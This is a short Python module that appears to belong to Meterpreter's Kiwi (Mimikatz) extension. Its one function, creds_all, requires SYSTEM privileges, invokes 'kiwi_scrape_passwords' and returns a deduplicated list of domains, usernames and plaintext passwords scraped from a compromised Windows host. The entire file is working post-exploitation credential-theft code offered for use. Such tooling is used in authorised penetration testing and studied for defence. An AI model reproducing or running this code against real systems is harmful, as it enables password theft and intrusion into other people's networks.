import meterpreter_bindings
import meterpreter.user

from meterpreter.core import *
from meterpreter.tlv import *

def creds_all():
  if not meterpreter.user.is_system():
    raise Exception('Unable to extract credentials: Not running as SYSTEM')

  tlv = tlv_pack(TLV_TYPE_KIWI_PWD_ID, 0)
  resp = invoke_meterpreter('kiwi_scrape_passwords', True, tlv)
  if resp == None:
    return False

  if packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] != 0:
    return False

  found = set([])
  creds = []
  for group in packet_enum_tlvs(resp, TLV_TYPE_KIWI_PWD_RESULT):
    domain = packet_get_tlv(group['value'], TLV_TYPE_KIWI_PWD_DOMAIN)
    username = packet_get_tlv(group['value'], TLV_TYPE_KIWI_PWD_USERNAME)
    password = packet_get_tlv(group['value'], TLV_TYPE_KIWI_PWD_PASSWORD)

    if domain and username and password:
      key = '{0}\x01{1}\x01{2}'.format(domain['value'], username['value'], password['value'])
      if not key in found:
        found.add(key)
        creds.append({
          'Domain': domain['value'],
          'Username': username['value'],
          'Password': password['value']
        })
  return creds
